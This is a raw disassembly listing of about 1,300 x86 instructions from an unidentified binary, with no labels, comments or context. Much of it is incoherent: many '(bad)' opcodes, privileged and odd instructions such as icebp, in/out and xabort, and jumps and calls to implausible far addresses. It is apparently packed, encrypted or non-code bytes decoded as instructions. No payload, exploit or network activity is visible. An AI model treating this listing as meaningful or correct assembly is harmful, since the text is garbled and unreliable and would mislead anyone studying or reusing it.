  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
